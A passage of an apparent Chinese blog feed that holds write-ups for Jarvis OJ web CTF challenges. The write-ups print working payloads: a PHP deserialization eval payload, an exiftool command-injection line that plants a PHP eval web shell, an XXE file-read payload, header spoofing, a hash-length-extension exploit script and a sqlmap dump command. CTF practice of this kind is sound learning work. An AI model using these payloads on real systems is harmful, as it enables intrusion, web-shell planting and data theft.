&lt;p&gt;rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）&lt;/p&gt;
&lt;p&gt;线下赛的web waf需要完善。&lt;/p&gt;
&lt;p&gt;新的pyc加密方式  &lt;code&gt;stegosaurus&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;writeup 如下&lt;br&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>【web】jarvis oj 刷题</title>
    <link href="https://winter3un.github.io/2017/06/17/jarvisoj-web/"/>
    <id>https://winter3un.github.io/2017/06/17/jarvisoj-web/</id>
    <published>2017-06-17T14:13:07.000Z</published>
    <updated>2017-07-08T15:30:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web？"><a href="#web？" class="headerlink" title="web？"></a>web？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> np</div><div class="line">o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]]</div><div class="line">r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>]</div><div class="line">o = np.array(o)</div><div class="line">r = np.array(r)</div><div class="line">x = np.linalg.solve(o,r)</div><div class="line"><span class="keyword">print</span> x</div><div class="line">string = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</div><div class="line">    string += chr(int(str(i)[<span class="number">0</span>:<span class="number">-2</span>]))</div><div class="line"><span class="keyword">print</span> string</div></pre></td></tr></table></figure><a id="more"></a><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。</p><p>html构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>几个payload </p><p><code>print_r(dirname(__FILE__));</code><br><code>print_r(scandir(dirname(__FILE__)));</code><br><code>print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code><br>序列化payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class OowoO</div><div class="line">&#123;</div><div class="line">    public $mdzz;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$m = new OowoO();</div><div class="line">$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; </div><div class="line"></div><div class="line">echo serialize($m);</div><div class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>ps: </p><p>参考资料<br>PHP Session 序列化及反序列化处理器 <a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>cve漏洞 imagick</p><p><code>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; imagick.png</code></p><p>shell</p><p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[a\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \&quot;&quot; imagick.png</code></p><p><code>CTF{873dfee87823248f4a1657650204697a}</code></p><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>一开始一脸懵比。。。</p><p>原来是XXE攻击</p><p>payload一发带走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;search&gt;name&lt;/search&gt;</div><div class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>考点：文件包含漏洞</p><p>1、泄露源码</p><p>但是关键字符被waf挡住了。</p><p>上传图片马</p><p><code>uploads/1497485980.gif</code></p><p>还是被waf拦截了，使用<code>&lt;script&gt;</code>绕过</p><p><code>CTF{upl0ad_sh0uld_n07_b3_a110wed}</code></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 127.0.0.1</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">X-Remote-IP: 127.0.0.1</div><div class="line">X-Remote-Addr: 127.0.0.1</div><div class="line">X-Client-IP: 127.0.0.1</div></pre></td></tr></table></figure></p><p>ssrf中ip.src的构建。</p><p>信息获取能力</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">robots.txt</div><div class="line">.index.php.swp</div><div class="line">.index.php.swo</div><div class="line">index.txt</div><div class="line">index.bak</div><div class="line">index.php~</div><div class="line">test.php</div><div class="line">index.phps</div><div class="line">phpinfo.php</div></pre></td></tr></table></figure><p>在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。</p><p><code>CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</code></p><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>考察点：</p><p>信息获取能力</p><p>vim缓存文件恢复 <code>vim -r index.php</code></p><p>哈希长度扩展攻击</p><p>可利用工具：</p><p><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">https://github.com/iagox86/hash_extender</a></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,os,urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">cmd = <span class="string">'./hash_extender -d ";\\"tseug\\":5:s" -s "3a4727d57463f122833d9e732f94e4e0" -a ";\\"nimda\\":5:s"  -f md5 --out-data-format=html -q -l '</span>+str(x)</div><div class="line"><span class="comment"># print cmd</span></div><div class="line">p = os.popen(cmd).read()</div><div class="line"><span class="comment"># break</span></div><div class="line">url = <span class="string">"http://web.jarvisoj.com:32778/"</span></div><div class="line">payload = <span class="string">"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; "</span></div><div class="line">payload += <span class="string">"hsh="</span>+p[:<span class="number">32</span>]+<span class="string">";"</span></div><div class="line"></div><div class="line">payload +=<span class="string">"role="</span>+urllib.quote(urllib.unquote(p[<span class="number">32</span>:])[::<span class="number">-1</span>])+<span class="string">";"</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"><span class="comment"># break</span></div><div class="line">head = &#123;<span class="string">"Cookie"</span>:payload&#125;</div><div class="line"></div><div class="line"></div><div class="line">data = requests.get(url=url,headers=head).content</div><div class="line"><span class="keyword">if</span> len(data) != <span class="number">210</span>:</div><div class="line"><span class="keyword">print</span> data</div></pre></td></tr></table></figure><p>参考资料：</p><p><a href="https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90" target="_blank" rel="external">https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>逆向思路。。gdb调试一波，拿到flag。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">//动态链接库路径</div><div class="line">#define LIB_CACULATE_PATH &quot;./udf.so&quot;</div><div class="line"></div><div class="line">//函数指针</div><div class="line">typedef int (*CAC_FUNC)();</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    void *handle;</div><div class="line">    char *error;</div><div class="line">    CAC_FUNC cac_func = NULL;</div><div class="line"></div><div class="line">    //打开动态链接库</div><div class="line">    handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, dlerror());</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //清除之前存在的错误</div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    //获取一个函数</div><div class="line">    *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, error);</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    (*cac_func)();</div><div class="line">    dlclose(handle);</div><div class="line">    exit(EXIT_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line">gcc -rdynamic -o main main.c -ldl</div></pre></td></tr></table></figure><h3 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h3><p><code>sqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;web？&quot;&gt;&lt;a href=&quot;#web？&quot; class=&quot;headerlink&quot; title=&quot;web？&quot;&gt;&lt;/a&gt;web？&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; np&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = [[&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;166&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span 